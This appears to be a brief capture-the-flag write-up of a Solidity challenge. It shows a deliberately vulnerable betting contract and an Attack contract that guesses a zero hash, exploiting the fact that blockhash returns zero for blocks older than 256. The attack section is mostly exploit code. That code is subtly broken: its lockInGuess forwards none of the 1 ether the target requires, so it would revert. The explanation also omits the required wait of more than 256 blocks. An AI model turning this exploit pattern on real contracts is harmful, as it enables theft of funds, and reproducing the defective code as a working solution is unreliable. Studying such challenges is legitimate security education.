## Description
I did not know that blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PredictTheBlockHash {
    address payable public player;
    bytes32 public guess;
    uint256 public settlementBlockNumber;

    constructor() public payable {
        require(msg.value == 1 ether);
    }

    function lockInGuess(bytes32 hash) public payable {
        require(player == address(0));
        require(msg.value == 1 ether);

        player = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == player);
        require(block.number > settlementBlockNumber);

        bytes32 answer = blockhash(settlementBlockNumber);

        player = address(0);

        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

```
contract Attack{
    PredictTheBlockHash public predictTheBlockHash;

    constructor(address _predictTheBlockHash) public {
        predictTheBlockHash = PredictTheBlockHash(_predictTheBlockHash);
    }

    function lockInGuess() public {
        predictTheBlockHash.lockInGuess(0x0000000000000000000000000000000000000000000000000000000000000000);
    }

    function settle() public {
        predictTheBlockHash.settle();
    }
}
```
